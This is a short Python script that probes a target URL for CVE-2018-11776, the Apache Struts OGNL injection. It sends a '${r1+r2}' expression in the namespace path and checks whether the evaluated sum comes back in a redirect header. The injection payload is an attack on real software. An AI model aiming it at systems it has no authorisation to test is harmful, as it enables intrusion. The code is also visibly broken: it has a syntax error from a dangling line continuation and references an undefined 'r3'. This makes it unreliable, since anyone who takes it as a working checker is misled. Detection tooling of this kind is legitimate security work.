import requests
from log_colors import *
import random
import json
import urllib.parse
import argparse

requests.packages.urllib3.disable_warnings()

# CVE-2018-11776
# Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16 
# suffer from possible Remote Code Execution 
# when alwaysSelectFullNamespace is true 
# (either by user or a plugin like Convention Plugin) 
# and then: 
# results are used with no namespace and in same time, 
# its upper package have no or wildcard namespace 
# and similar to results, same possibility 
# when using url tag which doesn't have 
# value and action set and in same time, 
# its upper package have no or wildcard namespace.
class CVE2018_11776:
    headers = {"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0"}

    def __init__(self, url):
        self.url = url
        self.r1 = random.randint(10000, 99999)
        self.r2 = random.randint(10000, 99999)
        self.r3 = self.r1 + self.r2
        self.session = requests.Session()

    def is_vuln(self):
        vuln = False
        r = self.session.get(
                self.url,
                timeout = 10, verify = False, allow_redirects = False
                )
        if r.ok:
            urli = urllib.parse.urlparse(self.url)
            self.url2 = urli.scheme + "://" +
            urli.netloc + '/${%s+%s}/help.action' % (self.r1, self.r2)

            r = self.session.get(
                    self.url2,
                    timeout = 10, verify = False, allow_redirects = False
                    )
            print (LogColors.YELLOW + 
                    "test the url for explot {}".format(self.url2) + 
                    LogColors.ENDC)
            if r.status_code == 302 and r.headers.get("Location") is not None and str(r3) in r.headers.get("Location"):
                location = r.headers.get('Location')
                vuln |= str(r3) in location

        if vuln:
            print (LogColors.GREEN + "{} is vulnerable :)".format(self.url) + LogColors.ENDC)
        else:
            print (LogColors.YELLOW + "{} is not vulnerable :(".format(self.url) + LogColors.ENDC)
        return vuln

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target apache struts2 url")
    args = vars(parser.parse_args())
    url = args['target']
    cve = CVE2018_11776(url)
    print (cve.is_vuln())

